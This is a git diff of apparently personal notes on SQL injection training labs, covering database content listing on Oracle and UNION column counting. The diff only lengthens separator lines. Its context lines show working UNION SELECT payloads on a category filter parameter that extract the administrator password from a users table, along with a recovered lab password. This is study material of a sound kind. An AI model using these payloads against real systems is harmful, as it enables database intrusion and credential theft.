@@ -95,7 +95,7 @@ Ans  : GET /filter?category='
       ' UNION SELECT password_rqmxso , 'ABC' FROM users_onouxe WHERE username_funlze='administrator' --+
 
 
-___________________________________________________________________________________________
+____________________________________________________________________________________________________________________________
 Lab6: SQL injection attack, listing the database contents on Oracle
 
 GIVEN  :The database contains a table that holds usernames and passwords
@@ -123,5 +123,5 @@ ANS : GET /filter?category=Gifts'--+
 
       'UNION SELECT PASSWORD_KWSPKR,'ABC' FROM USERS_BYFICP WHERE USERNAME_SLTNDT='administrator' --+  : nvtzkic1pfd8yay6eptu
 
-___________________________________________________________________________________________
+____________________________________________________________________________________________________________________________
 Lab7: SQL injection UNION attack, determining the number of columns returned by the query
